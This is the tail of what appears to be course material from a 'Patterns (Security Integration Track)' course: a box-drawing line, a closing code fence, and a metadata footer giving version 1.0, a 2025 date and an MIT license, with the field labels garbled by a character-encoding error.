‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

---

**–í–µ—Ä—Å–∏—è**: 1.0  
**–î–∞—Ç–∞**: 2025-10-11  
**–ö—É—Ä—Å**: Patterns (Security Integration Track)  
**–õ–∏—Ü–µ–Ω–∑–∏—è**: MIT

